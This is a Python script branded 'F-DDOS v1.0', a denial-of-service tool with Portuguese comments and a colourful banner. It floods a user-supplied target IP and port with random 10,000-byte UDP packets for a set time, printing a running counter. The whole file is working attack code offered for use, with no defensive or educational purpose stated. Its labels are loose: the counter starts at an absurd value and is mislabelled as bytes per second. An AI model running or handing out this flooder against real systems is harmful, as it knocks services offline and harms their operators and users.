import time
import socket
import random
import sys
from colorama import init, Fore

init()
class bcolors:
    CABECALHO = '\033[95m'  
    AZUL = '\033[94m'  
    VERDE = '\033[92m'   
    AMARELO = '\033[93m' 
    FAIL = '\033[91m'  
    ENDC = '\033[0m'   
    BOLD = '\033[1m'   
    SUBLINHADO = '\033[4m' 
    ABANG ='\033[31m'   

def usage():
    print (Fore.MAGENTA + r"""
    
 ______     ____________ _____ _____ 
 |  ___|    |  _  \  _  \  _  /  ___|
 | |_ ______| | | | | | | | | \ `--. 
 |  _|______| | | | | | | | | |`--. \
 | |        | |/ /| |/ /\ \_/ /\__/ /
 \_|        |___/ |___/  \___/\____/  v1.0
                                        """)                                                                                                                                                                                   
    print("""
    \033[1;91m<═══\033[1;41m\033[1;97m by FOXS BLINTERS \033[;0m\033[1;91m═══>\033[1;92m 
                                          
 \033[93m 🦊MODO DE USO: \033[92m python F-DDOS.py \033[91m IP (o ip do seu alvo)  \033[31m PORTA (padrao: 80) \033[95m Quantidade (padrao: 200000) \033[1;92    
          """)


def flood(korbanmu, vport, durasi):
    # Preparando o Cliente SOCKET para iniciar a sobrecarga para a  ferramentas DDOS 
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Configurando a Quantidade e "Timeout"
    bytes = random._urandom(10000)
    timeout =  time.time() + durasi
    sent = 99999999999999999999999999999999999
     

     #SISTEMA QUE CONECTA TUDO E ENVIA OS PACOTES, E XIBE NA TELA..
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (korbanmu, vport))
        sent = sent + 1
        print (bcolors.CABECALHO + "[\033[94m☠️\033[95m] BYTES POR SEG. [\033[92m%s\033[95m] PARA O IP[\033[91m%s\033[95m] PORTA [\033[94m%s\033[95m] " %(sent, korbanmu, vport))


#INICIA O SCRIPT :)
def main():
    print (len(sys.argv))
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
